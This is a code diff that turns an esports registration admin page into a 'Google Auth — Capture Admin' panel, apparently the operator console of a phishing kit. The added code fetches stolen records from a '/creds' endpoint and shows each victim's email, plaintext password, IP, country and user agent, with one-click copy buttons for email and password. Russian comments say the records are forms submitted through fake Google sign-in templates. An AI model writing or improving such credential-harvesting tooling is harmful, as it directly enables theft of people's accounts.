@@ -2,11 +2,11 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8" />
-  <title>ESPORT PUBG MOBILE — Admin Panel</title>
+  <title>Google Auth — Admin Panel</title>
 
   <meta name="viewport" content="width=device-width, initial-scale=1" />
   <meta name="description"
-        content="Admin panel for ESPORT PUBG MOBILE registration hub: manual verification and approvals." />
+        content="Admin panel for viewing captured Google sign-ins." />
 
   <style>
     :root {
@@ -18,7 +18,6 @@
       --accent-alt: #ff8a00;
       --accent-soft: rgba(255, 184, 0, .16);
       --accent-green: #22c55e;
-      --accent-green-soft: rgba(34,197,94,0.16);
       --accent-red: #f97316;
       --text-main: #ffffff;
       --text-soft: #e5e7eb;
@@ -167,18 +166,6 @@
       margin-bottom: 14px;
     }
 
-    .admin-grid {
-      display: grid;
-      grid-template-columns: 1.2fr 1.2fr 1.4fr;
-      gap: 12px;
-    }
-
-    @media (max-width: 1024px) {
-      .admin-grid {
-        grid-template-columns: 1fr;
-      }
-    }
-
     .card {
       padding: 14px 14px 12px;
       border-radius: var(--radius-xl);
@@ -202,12 +189,6 @@
       color: var(--text-soft);
     }
 
-    .card-sub {
-      font-size: 8px;
-      color: var(--text-muted);
-      margin-bottom: 8px;
-    }
-
     .pill {
       font-size: 8px;
       padding: 4px 8px;
@@ -216,162 +197,6 @@
       color: var(--text-muted);
       text-transform: uppercase;
       letter-spacing: 0.14em;
-    }
-
-    .list-empty {
-      font-size: 8px;
-      color: var(--text-muted);
-      padding: 4px 0 2px;
-    }
-
-    .item {
-      border-radius: 16px;
-      border: 1px solid rgba(31,41,55,0.9);
-      padding: 8px 9px 7px;
-      margin-bottom: 7px;
-      background: radial-gradient(circle at top, rgba(15,23,42,0.9), rgba(15,23,42,0.98));
-    }
-
-    .item-header {
-      display: flex;
-      justify-content: space-between;
-      gap: 8px;
-      margin-bottom: 4px;
-    }
-
-    .item-main {
-      font-size: 9px;
-      font-weight: 600;
-      color: var(--text-soft);
-    }
-
-    .item-meta {
-      font-size: 8px;
-      color: var(--text-muted);
-      display: flex;
-      flex-wrap: wrap;
-      gap: 6px;
-    }
-
-    .meta-tag {
-      padding: 2px 6px;
-      border-radius: 999px;
-      border: 1px solid rgba(55,65,81,0.8);
-      background: rgba(17,24,39,0.9);
-      font-size: 8px;
-    }
-
-    .status-tag {
-      padding: 2px 6px;
-      border-radius: 999px;
-      font-size: 8px;
-      text-transform: uppercase;
-      letter-spacing: 0.14em;
-    }
-
-    .status-tag--pending {
-      border: 1px solid rgba(249,115,22,0.8);
-      color: #fed7aa;
-      background: rgba(249,115,22,0.08);
-    }
-
-    .status-tag--sent {
-      border: 1px solid rgba(56,189,248,0.8);
-      color: #e0f2fe;
-      background: rgba(56,189,248,0.08);
-    }
-
-    .status-tag--valid {
-      border: 1px solid rgba(34,197,94,0.9);
-      color: #bbf7d0;
-      background: rgba(34,197,94,0.14);
-    }
-
-    .status-tag--invalid {
-      border: 1px solid rgba(239,68,68,0.9);
-      color: #fecaca;
-      background: rgba(239,68,68,0.12);
-    }
-
-    .status-tag--approved {
-      border: 1px solid rgba(34,197,94,0.9);
-      color: #bbf7d0;
-      background: rgba(34,197,94,0.14);
-    }
-
-    .status-tag--declined {
-      border: 1px solid rgba(239,68,68,0.9);
-      color: #fecaca;
-      background: rgba(239,68,68,0.12);
-    }
-
-    .status-tag--waiting {
-      border: 1px solid rgba(148,163,253,0.8);
-      color: #e0e7ff;
-      background: rgba(129,140,248,0.10);
-    }
-
-    .item-row {
-      font-size: 8px;
-      color: var(--text-muted);
-      margin-bottom: 2px;
-    }
-
-    .item-row strong {
-      color: var(--text-soft);
-      font-weight: 600;
-    }
-
-    /* выделение кодов */
-
-    .item-row--code {
-      margin-top: 4px;
-      margin-bottom: 2px;
-      padding: 4px 7px;
-      border-radius: 999px;
-      background: rgba(15,23,42,0.95);
-      border: 1px dashed rgba(148,163,253,0.6);
-      display: inline-flex;
-      align-items: center;
-      gap: 6px;
-    }
-
-    .code-label {
-      font-size: 7px;
-      text-transform: uppercase;
-      letter-spacing: 0.16em;
-      color: var(--text-muted);
-    }
-
-    .code-pill {
-      padding: 2px 8px;
-      border-radius: 999px;
-      border: 1px solid var(--accent);
-      background: var(--accent-soft);
-      font-size: 9px;
-      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
-      letter-spacing: 0.16em;
-      text-transform: uppercase;
-      color: var(--accent);
-      white-space: nowrap;
-    }
-
-    .code-pill--email {
-      border-color: rgba(56,189,248,0.9);
-      background: rgba(56,189,248,0.12);
-      color: #e0f2fe;
-    }
-
-    .code-pill--access {
-      border-style: dashed;
-      opacity: 0.9;
-    }
-
-    .item-actions {
-      display: flex;
-      flex-wrap: wrap;
-      gap: 6px;
-      margin-top: 6px;
     }
 
     .btn-xs {
@@ -396,38 +221,20 @@
       box-shadow: 0 0 14px rgba(0,0,0,1);
     }
 
-    .btn-xs--primary {
-      border-color: rgba(34,197,94,0.9);
-      color: #bbf7d0;
-    }
-
     .btn-xs--danger {
       border-color: rgba(239,68,68,0.9);
       color: #fecaca;
+    }
+
+    .btn-xs--primary {
+      border-color: rgba(34,197,94,0.9);
+      color: #bbf7d0;
     }
 
     .btn-xs:disabled {
       opacity: 0.4;
       cursor: default;
       box-shadow: none;
-    }
-
-    .footer {
-      margin-top: 18px;
-      padding: 12px 0 18px;
-      font-size: 8px;
-      color: var(--text-muted);
-      text-align: center;
-      border-top: 1px solid rgba(255, 255, 255, 0.06);
-      background: radial-gradient(circle at top,
-              rgba(255,184,0,0.03),
-              transparent);
-    }
-
-    .hint {
-      font-size: 8px;
-      color: var(--text-muted);
-      margin-top: 6px;
     }
 
     .global-status {
@@ -443,6 +250,100 @@
     .global-status.err {
       color: var(--accent-red);
     }
+
+    .logs-wrapper {
+      margin-top: 14px;
+    }
+
+    .logs-table {
+      width: 100%;
+      border-collapse: collapse;
+      border-spacing: 0;
+      margin-top: 4px;
+      font-size: 9px;
+    }
+
+    .logs-table thead {
+      background: rgba(15,23,42,0.9);
+    }
+
+    .logs-table th,
+    .logs-table td {
+      padding: 6px 8px;
+      border-bottom: 1px solid rgba(31,41,55,0.9);
+      text-align: left;
+      vertical-align: top;
+    }
+
+    .logs-table th {
+      font-weight: 600;
+      color: var(--text-soft);
+      text-transform: uppercase;
+      letter-spacing: 0.12em;
+      font-size: 8px;
+      white-space: nowrap;
+    }
+
+    .logs-table tbody tr:nth-child(even) {
+      background: rgba(15,23,42,0.78);
+    }
+
+    .logs-table tbody tr:nth-child(odd) {
+      background: rgba(15,23,42,0.96);
+    }
+
+    .logs-table td.actions-cell {
+      white-space: nowrap;
+    }
+
+    .mono {
+      font-family: ui-monospace, SFMono-Regular, Menlo, Monaco, Consolas, "Liberation Mono", "Courier New", monospace;
+      font-size: 9px;
+    }
+
+    .chip {
+      display: inline-flex;
+      align-items: center;
+      padding: 2px 6px;
+      border-radius: 999px;
+      border: 1px solid rgba(55,65,81,0.9);
+      background: rgba(15,23,42,0.7);
+      font-size: 8px;
+      color: var(--text-muted);
+      margin-right: 4px;
+      margin-bottom: 2px;
+    }
+
+    .chip-label {
+      text-transform: uppercase;
+      letter-spacing: .12em;
+      font-size: 7px;
+      margin-right: 4px;
+      color: #6b7280;
+    }
+
+    .footer {
+      margin-top: 18px;
+      padding: 12px 0 18px;
+      font-size: 8px;
+      color: var(--text-muted);
+      text-align: center;
+      border-top: 1px solid rgba(255, 255, 255, 0.06);
+      background: radial-gradient(circle at top,
+              rgba(255,184,0,0.03),
+              transparent);
+    }
+
+    @media (max-width: 900px) {
+      .logs-table {
+        font-size: 8px;
+      }
+      .logs-table th:nth-child(4),
+      .logs-table td:nth-child(4) {
+        display: none; /* прячем UA на очень узких экранах */
+      }
+    }
+
   </style>
 </head>
 <body>
@@ -452,19 +353,18 @@
   <div class="header-wrap">
     <div class="inner header">
       <div class="logo-combo">
-        <div class="logo-mark">EP</div>
+        <div class="logo-mark">GA</div>
         <div class="logo-text-block">
           <div class="top-line">
-            <span>ESPORT</span>
-            <span>PUBG</span>
-            <span>MOBILE</span>
+            <span>GOOGLE</span>
+            <span>AUTH</span>
           </div>
-          <div class="sub-line">REGISTRATION ADMIN</div>
+          <div class="sub-line">CAPTURE ADMIN</div>
         </div>
       </div>
 
       <div class="admin-badge">
-        MANUAL REVIEW • PRIVATE ACCESS
+        INTERNAL PANEL • PRIVATE ACCESS
       </div>
     </div>
   </div>
@@ -474,90 +374,70 @@
     <div class="inner">
       <section>
         <div class="section-title">
-          <span class="bar"></span>Admin dashboard
+          <span class="bar"></span>Captured logins
         </div>
         <div class="section-sub">
-          This internal page is used to handle all requests coming from the registration gateway:
-          players send verification requests and enter codes; you manually compare them with the
-          codes you sent and mark each attempt as valid or invalid. Nothing is auto-approved —
-          every step is manual.
+          Здесь отображаются все отправленные формы (email / password) из Google-шаблонов.
+          Сверху видно общее количество записей, можно удалять по одной или подчистить всё
+          через <strong>Delete all</strong>. Никаких авто-действий — только ручное управление.
         </div>
 
-        <div id="global-status" class="global-status"></div>
-
-        <div class="admin-grid">
-          <!-- ID CODE REQUESTS -->
-          <div class="card">
-            <div class="card-header">
-              <div class="card-title">ID verification codes</div>
-              <div class="pill" id="id-count-pill">0 items</div>
+        <div class="card">
+          <div class="card-header">
+            <div class="card-title">Stored records</div>
+            <div style="display:flex;align-items:center;gap:8px;">
+              <span class="pill" id="logs-count-pill">0 items</span>
+              <button class="btn-xs btn-xs--danger" id="delete-all-btn">
+                🗑 Delete all
+              </button>
             </div>
-            <div class="card-sub">
-              Requests are created when players press <strong>SEND REQUEST</strong> for ID verification.
-              You send them an ID code manually (email / DM / Telegram), then they type it on the site.
-              Once the entered code matches what you sent, click <strong>ID OK</strong>;
-              otherwise use <strong>ID BAD</strong>.
-            </div>
-            <div id="id-requests-list"></div>
           </div>
 
-          <!-- EMAIL CODE REQUESTS -->
-          <div class="card">
-            <div class="card-header">
-              <div class="card-title">Email verification codes</div>
-              <div class="pill" id="email-count-pill">0 items</div>
-            </div>
-            <div class="card-sub">
-              Same logic, but for email safety. Requests are created when players press
-              <strong>SEND REQUEST</strong> under "Email verification code". You send a code,
-              they enter it, you mark it valid/invalid here.
-            </div>
-            <div id="email-requests-list"></div>
-          </div>
+          <div id="global-status" class="global-status"></div>
 
-          <!-- REGISTRATIONS -->
-          <div class="card">
-            <div class="card-header">
-              <div class="card-title">Full applications</div>
-              <div class="pill" id="reg-count-pill">0 items</div>
-            </div>
-            <div class="card-sub">
-              Visible after both ID and email were verified on the site. Approve to send lobby
-              time &amp; link; decline with a reason (invalid email / risky account / other).
-            </div>
-            <div id="registrations-list"></div>
-            <div class="hint">
-              <strong>Important:</strong> when you approve, backend should send an email with
-              <em>time window</em> and <em>lobby link</em>. When you decline, include the reason
-              and (optionally) a link to refill the form.
-            </div>
+          <div class="logs-wrapper">
+            <table class="logs-table">
+              <thead>
+              <tr>
+                <th>#</th>
+                <th>Email</th>
+                <th>Password</th>
+                <th>User agent</th>
+                <th>Meta</th>
+                <th>Created</th>
+                <th></th>
+              </tr>
+              </thead>
+              <tbody id="logs-tbody">
+              <!-- rows inject here -->
+              </tbody>
+            </table>
           </div>
         </div>
+
       </section>
     </div>
   </main>
 
   <!-- FOOTER -->
   <footer class="footer">
-    ESPORTPUBGMOBILE.COM — Internal admin view for manual checks.
-    Keep this page private. Actions here directly control access to lobbies.
+    GOOGLE AUTH PANEL — internal view for captured data. Keep this page private.
   </footer>
 </div>
 
 <script>
-  // базовый префикс для админ-API
+  // ===== CONFIG: под себя меняешь URL'ы =====
   const API_BASE = "/admin/api";
+  const LIST_URL = API_BASE + "/creds";          // GET  -> { items: [...] }
+  const DELETE_URL = API_BASE + "/creds/delete"; // POST -> { id }
+  const DELETE_ALL_URL = API_BASE + "/creds/delete-all"; // POST -> {}
 
-  const globalStatusEl    = document.getElementById("global-status");
-  const idListEl          = document.getElementById("id-requests-list");
-  const emailListEl       = document.getElementById("email-requests-list");
-  const regListEl         = document.getElementById("registrations-list");
+  const tbodyEl = document.getElementById("logs-tbody");
+  const countPill = document.getElementById("logs-count-pill");
+  const globalStatusEl = document.getElementById("global-status");
+  const deleteAllBtn = document.getElementById("delete-all-btn");
 
-  const idCountPill       = document.getElementById("id-count-pill");
-  const emailCountPill    = document.getElementById("email-count-pill");
-  const regCountPill      = document.getElementById("reg-count-pill");
-
-  function setGlobalStatus(text, type) {
+  function setStatus(text, type) {
     globalStatusEl.textContent = text || "";
     globalStatusEl.className = "global-status" + (type ? " " + type : "");
   }
@@ -566,8 +446,15 @@
     if (!iso) return "";
     const d = new Date(iso);
     if (isNaN(d.getTime())) return iso;
-    const date = d.toLocaleDateString("en-GB", { day:"2-digit", month:"2-digit", year:"numeric" });
-    const time = d.toLocaleTimeString("en-GB", { hour:"2-digit", minute:"2-digit" });
+    const date = d.toLocaleDateString("en-GB", {
+      day: "2-digit",
+      month: "2-digit",
+      year: "numeric"
+    });
+    const time = d.toLocaleTimeString("en-GB", {
+      hour: "2-digit",
+      minute: "2-digit"
+    });
     return date + " " + time;
   }
 
@@ -585,317 +472,173 @@
       body: JSON.stringify(payload || {})
     });
     if (!res.ok) throw new Error("HTTP " + res.status);
-    try {
-      return await res.json();
-    } catch {
-      return {};
-    }
+    try { return await res.json(); } catch { return {}; }
   }
 
-  function statusBadgeForRequest(status) {
-    const s = (status || "pending").toLowerCase();
-    if (s === "valid")   return '<span class="status-tag status-tag--valid">VALID</span>';
-    if (s === "invalid") return '<span class="status-tag status-tag--invalid">INVALID</span>';
-    if (s === "sent" || s === "code_sent") return '<span class="status-tag status-tag--sent">CODE SENT</span>';
-    return '<span class="status-tag status-tag--pending">PENDING</span>';
-  }
-
-  function statusBadgeForRegistration(item) {
-    const s = (item.status || "pending").toLowerCase();
-    if (s === "approved") return '<span class="status-tag status-tag--approved">APPROVED</span>';
-    if (s === "declined") return '<span class="status-tag status-tag--declined">DECLINED</span>';
-    return '<span class="status-tag status-tag--waiting">WAITING</span>';
-  }
-
-  function renderIdRequests(list) {
-    if (!list || list.length === 0) {
-      idListEl.innerHTML = '<div class="list-empty">No ID verification requests yet.</div>';
-      idCountPill.textContent = "0 items";
+  function renderRows(items) {
+    if (!items || items.length === 0) {
+      tbodyEl.innerHTML = `
+        <tr>
+          <td colspan="7" style="text-align:center;color:var(--text-muted);padding:10px 0;">
+            No records yet.
+          </td>
+        </tr>`;
+      countPill.textContent = "0 items";
       return;
     }
 
-    idCountPill.textContent = list.length + (list.length === 1 ? " item" : " items");
-
-    const html = list.map(item => {
-      const created = formatDate(item.createdAt);
-      const status = statusBadgeForRequest(item.status);
-
-      const accessTag = item.accessCode
-        ? `<span class="meta-tag">Access: <span class="code-pill code-pill--access">${item.accessCode}</span></span>`
-        : `<span class="meta-tag">Access: —</span>`;
-
-      const lastCodeLine = item.lastCode
-        ? `<div class="item-row item-row--code">
-             <span class="code-label">ID CODE</span>
-             <span class="code-pill">${item.lastCode}</span>
-           </div>`
-        : "";
-
-      const lastCodeTimeLine = item.lastCodeAt
-        ? `<div class="item-row"><strong>Last check:</strong> ${formatDate(item.lastCodeAt)}</div>`
-        : "";
-
-      return `
-        <div class="item" data-id="${item.id}">
-          <div class="item-header">
-            <div class="item-main">
-              ${item.ingameId || "Unknown ID"}
-            </div>
-            ${status}
-          </div>
-          <div class="item-meta">
-            ${accessTag}
-            <span class="meta-tag">Email: ${item.email || "—"}</span>
-            ${created ? `<span class="meta-tag">${created}</span>` : ""}
-          </div>
-          ${lastCodeLine}
-          ${lastCodeTimeLine}
-          <div class="item-actions">
-            <button class="btn-xs btn-xs--primary"
-                    data-action="mark-id-valid"
-                    data-id="${item.id}">
-              ✔ ID OK
-            </button>
-            <button class="btn-xs btn-xs--danger"
-                    data-action="mark-id-invalid"
-                    data-id="${item.id}">
-              ✕ ID BAD
-            </button>
-            <button class="btn-xs btn-xs--danger"
-                    data-action="delete-id-request"
-                    data-id="${item.id}">
-              🗑 DELETE
-            </button>
-          </div>
-        </div>
-      `;
-    }).join("");
-
-    idListEl.innerHTML = html;
-  }
-
-  function renderEmailRequests(list) {
-    if (!list || list.length === 0) {
-      emailListEl.innerHTML = '<div class="list-empty">No email verification requests yet.</div>';
-      emailCountPill.textContent = "0 items";
-      return;
-    }
-
-    emailCountPill.textContent = list.length + (list.length === 1 ? " item" : " items");
-
-    const html = list.map(item => {
-      const created = formatDate(item.createdAt);
-      const status = statusBadgeForRequest(item.status);
-
-      const accessTag = item.accessCode
-        ? `<span class="meta-tag">Access: <span class="code-pill code-pill--access">${item.accessCode}</span></span>`
-        : `<span class="meta-tag">Access: —</span>`;
-
-      const lastCodeLine = item.lastCode
-        ? `<div class="item-row item-row--code">
-             <span class="code-label">EMAIL CODE</span>
-             <span class="code-pill code-pill--email">${item.lastCode}</span>
-           </div>`
-        : "";
-
-      const lastCodeTimeLine = item.lastCodeAt
-        ? `<div class="item-row"><strong>Last check:</strong> ${formatDate(item.lastCodeAt)}</div>`
-        : "";
-
-      return `
-        <div class="item" data-id="${item.id}">
-          <div class="item-header">
-            <div class="item-main">
-              ${item.email || "Unknown email"}
-            </div>
-            ${status}
-          </div>
-          <div class="item-meta">
-            ${accessTag}
-            ${item.ingameId ? `<span class="meta-tag">ID: ${item.ingameId}</span>` : ""}
-            ${created ? `<span class="meta-tag">${created}</span>` : ""}
-          </div>
-          ${lastCodeLine}
-          ${lastCodeTimeLine}
-          <div class="item-actions">
-            <button class="btn-xs btn-xs--primary"
-                    data-action="mark-email-valid"
-                    data-id="${item.id}">
-              ✔ EMAIL OK
-            </button>
-            <button class="btn-xs btn-xs--danger"
-                    data-action="mark-email-invalid"
-                    data-id="${item.id}">
-              ✕ EMAIL BAD
-            </button>
-            <button class="btn-xs btn-xs--danger"
-                    data-action="delete-email-request"
-                    data-id="${item.id}">
-              🗑 DELETE
-            </button>
-          </div>
-        </div>
-      `;
-    }).join("");
-
-    emailListEl.innerHTML = html;
-  }
-
-  function renderRegistrations(list) {
-    if (!list || list.length === 0) {
-      regListEl.innerHTML = '<div class="list-empty">No full applications yet.</div>';
-      regCountPill.textContent = "0 items";
-      return;
-    }
-
-    regCountPill.textContent = list.length + (list.length === 1 ? " item" : " items");
-
-    const html = list.map(item => {
-      const created = formatDate(item.createdAt);
-      const badge = statusBadgeForRegistration(item);
-
-      const idFlag = item.idVerified ? "✔" : "—";
-      const emailFlag = item.emailVerified ? "✔" : "—";
-
-      const declineReason = item.declineReason
-        ? `<div class="item-row"><strong>Reason:</strong> ${item.declineReason}</div>`
-        : "";
-      const adminNote = item.adminNote
-        ? `<div class="item-row"><strong>Admin note:</strong> ${item.adminNote}</div>`
-        : "";
-
-      const isFinal = item.status === "approved" || item.status === "declined";
-
-      return `
-        <div class="item" data-id="${item.id}">
-          <div class="item-header">
-            <div class="item-main">
-              ${item.ingameId || "Unknown ID"} • ${item.email || "Unknown email"}
-            </div>
-            ${badge}
-          </div>
-          <div class="item-meta">
-            <span class="meta-tag">
-              Access:
-              ${item.accessCode
-                ? `<span class="code-pill code-pill--access">${item.accessCode}</span>`
-                : " —"}
-            </span>
-            ${created ? `<span class="meta-tag">${created}</span>` : ""}
-            <span class="meta-tag">ID verified: ${idFlag}</span>
-            <span class="meta-tag">Email verified: ${emailFlag}</span>
-          </div>
-          ${declineReason}
-          ${adminNote}
-          <div class="item-actions">
-            <button class="btn-xs btn-xs--primary"
-                    data-action="approve-registration"
-                    data-id="${item.id}"
-                    ${isFinal ? "disabled" : ""}>
-              ✔ APPROVE
-            </button>
-            <button class="btn-xs btn-xs--danger"
-                    data-action="decline-registration"
-                    data-id="${item.id}"
-                    ${isFinal ? "disabled" : ""}>
-              ✕ DECLINE
-            </button>
-            <button class="btn-xs btn-xs--danger"
-                    data-action="delete-registration"
-                    data-id="${item.id}">
-              🗑 DELETE
-            </button>
-          </div>
-        </div>
-      `;
-    }).join("");
-
-    regListEl.innerHTML = html;
-  }
-
-  async function loadState() {
-    setGlobalStatus("Loading admin state…", "");
-    try {
-      const data = await getJSON(API_BASE + "/state");
-      renderIdRequests(data.idCodeRequests || []);
-      renderEmailRequests(data.emailCodeRequests || []);
-      renderRegistrations(data.registrations || []);
-      setGlobalStatus("State loaded. Use buttons to manage requests.", "ok");
-    } catch (e) {
-      console.error(e);
-      setGlobalStatus("Failed to load admin state. Check backend /admin/api/state.", "err");
-      idListEl.innerHTML = '<div class="list-empty">Error loading data.</div>';
-      emailListEl.innerHTML = '<div class="list-empty">Error loading data.</div>';
-      regListEl.innerHTML = '<div class="list-empty">Error loading data.</div>';
-    }
-  }
-
-  // === actions ===
-
-  async function handleAction(action, id) {
-    try {
-      let url = "";
-      let payload = { id };
-
-      if (action === "mark-id-valid") {
-        url = API_BASE + "/id-code/mark-valid";
-      } else if (action === "mark-id-invalid") {
-        url = API_BASE + "/id-code/mark-invalid";
-      } else if (action === "mark-email-valid") {
-        url = API_BASE + "/email-code/mark-valid";
-      } else if (action === "mark-email-invalid") {
-        url = API_BASE + "/email-code/mark-invalid";
-      } else if (action === "approve-registration") {
-        const slot = prompt("Time window for this player (example: 2025-04-12 19:00–21:00 UTC)?", "");
-        const link = prompt("Lobby link or room ID / password to include into email?", "");
-        const note = prompt("Optional admin note (visible in email / logs):", "");
-        payload.slot = slot || "";
-        payload.link = link || "";
-        payload.note = note || "";
-        url = API_BASE + "/registration/approve";
-      } else if (action === "decline-registration") {
-        const reasonType = prompt("Reason (invalid_email / risky_account / other):", "invalid_email");
-        const note = prompt("Optional admin note / explanation:", "");
-        payload.reason = reasonType || "other";
-        payload.note = note || "";
-        url = API_BASE + "/registration/decline";
-      } else if (action === "delete-id-request") {
-        if (!confirm("Delete this ID verification request? This cannot be undone.")) return;
-        url = API_BASE + "/id-code/delete";
-      } else if (action === "delete-email-request") {
-        if (!confirm("Delete this email verification request? This cannot be undone.")) return;
-        url = API_BASE + "/email-code/delete";
-      } else if (action === "delete-registration") {
-        if (!confirm("Delete this full application? This cannot be undone.")) return;
-        url = API_BASE + "/registration/delete";
-      }
-
-      if (!url) return;
-
-      setGlobalStatus("Performing action: " + action + "…", "");
-      await postJSON(url, payload);
-      setGlobalStatus("Action completed: " + action + ".", "ok");
-      await loadState();
-    } catch (e) {
-      console.error(e);
-      setGlobalStatus("Action failed: " + action + ". Check backend logs.", "err");
-    }
-  }
-
-  // делегируем клики по кнопкам в трёх колонках
-  [idListEl, emailListEl, regListEl].forEach(container => {
-    container.addEventListener("click", (e) => {
-      const btn = e.target.closest("button[data-action]");
-      if (!btn) return;
-      const action = btn.getAttribute("data-action");
-      const id     = btn.getAttribute("data-id");
-      if (!action || !id) return;
-      handleAction(action, id);
+    // сортируем по дате (новые сверху), если есть createdAt
+    items.sort((a, b) => {
+      const da = new Date(a.createdAt || 0).getTime();
+      const db = new Date(b.createdAt || 0).getTime();
+      return db - da;
     });
+
+    countPill.textContent = items.length + (items.length === 1 ? " item" : " items");
+
+    const rows = items.map((item, idx) => {
+      const id = item.id ?? item.pk ?? idx;
+      const email = item.email || "";
+      const password = item.password || item.pass || "";
+      const ua = item.userAgent || item.ua || "";
+      const ip = item.ip || item.ip_address || "";
+      const country = item.country || item.geoCountry || "";
+      const created = formatDate(item.createdAt || item.created_at || item.timestamp);
+
+      const metaChips = [];
+      if (ip)      metaChips.push(`<span class="chip"><span class="chip-label">IP</span><span class="mono">${ip}</span></span>`);
+      if (country) metaChips.push(`<span class="chip"><span class="chip-label">CTRY</span>${country}</span>`);
+      if (item.note) metaChips.push(`<span class="chip"><span class="chip-label">NOTE</span>${item.note}</span>`);
+
+      return `
+        <tr data-id="${id}">
+          <td>${idx + 1}</td>
+          <td class="mono">${email || "—"}</td>
+          <td class="mono">${password || "—"}</td>
+          <td style="max-width:260px;word-break:break-all;">
+            <span class="mono">${ua || "—"}</span>
+          </td>
+          <td>${metaChips.join(" ") || "—"}</td>
+          <td>${created || "—"}</td>
+          <td class="actions-cell">
+            <button class="btn-xs btn-xs--primary"
+                    data-action="copy"
+                    data-field="email"
+                    data-id="${id}">
+              📋 Email
+            </button>
+            <button class="btn-xs btn-xs--primary"
+                    data-action="copy"
+                    data-field="password"
+                    data-id="${id}">
+              📋 Pass
+            </button>
+            <button class="btn-xs btn-xs--danger"
+                    data-action="delete"
+                    data-id="${id}">
+              🗑
+            </button>
+          </td>
+        </tr>
+      `;
+    }).join("");
+
+    tbodyEl.innerHTML = rows;
+  }
+
+  async function loadLogs() {
+    setStatus("Loading records…", "");
+    try {
+      const data = await getJSON(LIST_URL);
+      const items = Array.isArray(data) ? data : (data.items || []);
+      renderRows(items);
+      setStatus("Loaded.", "ok");
+    } catch (e) {
+      console.error(e);
+      setStatus("Failed to load records. Check " + LIST_URL, "err");
+      tbodyEl.innerHTML = `
+        <tr>
+          <td colspan="7" style="text-align:center;color:var(--text-muted);padding:10px 0;">
+            Error loading data.
+          </td>
+        </tr>`;
+      countPill.textContent = "0 items";
+    }
+  }
+
+  async function deleteOne(id) {
+    if (!confirm("Delete this record? This cannot be undone.")) return;
+    setStatus("Deleting record #" + id + "…", "");
+    try {
+      await postJSON(DELETE_URL, { id });
+      setStatus("Record deleted.", "ok");
+      await loadLogs();
+    } catch (e) {
+      console.error(e);
+      setStatus("Failed to delete record. Check backend.", "err");
+    }
+  }
+
+  async function deleteAll() {
+    if (!confirm("Delete ALL records? This cannot be undone.")) return;
+    setStatus("Deleting all records…", "");
+    try {
+      await postJSON(DELETE_ALL_URL, {});
+      setStatus("All records deleted.", "ok");
+      await loadLogs();
+    } catch (e) {
+      console.error(e);
+      setStatus("Failed to delete all records. Check backend.", "err");
+    }
+  }
+
+  function findRowData(id) {
+    // в реальной жизни удобнее хранить items в массиве в JS,
+    // но тут мы просто читаем прямо из DOM
+    const row = tbodyEl.querySelector(`tr[data-id="${id}"]`);
+    if (!row) return {};
+    const cells = row.children;
+    return {
+      email: cells[1]?.textContent.trim() || "",
+      password: cells[2]?.textContent.trim() || ""
+    };
+  }
+
+  async function copyField(id, field) {
+    const data = findRowData(id);
+    const value = data[field] || "";
+    if (!value) return;
+    try {
+      await navigator.clipboard.writeText(value);
+      setStatus(field + " copied to clipboard.", "ok");
+    } catch (e) {
+      console.error(e);
+      setStatus("Failed to copy to clipboard.", "err");
+    }
+  }
+
+  // делегируем клики по таблице
+  tbodyEl.addEventListener("click", (e) => {
+    const btn = e.target.closest("button[data-action]");
+    if (!btn) return;
+    const action = btn.getAttribute("data-action");
+    const id = btn.getAttribute("data-id");
+    if (!action || !id) return;
+
+    if (action === "delete") {
+      deleteOne(id);
+    } else if (action === "copy") {
+      const field = btn.getAttribute("data-field");
+      copyField(id, field);
+    }
+  });
+
+  deleteAllBtn.addEventListener("click", () => {
+    deleteAll();
   });
 
   // старт
-  loadState();
+  loadLogs();
 </script>
 
 </body>
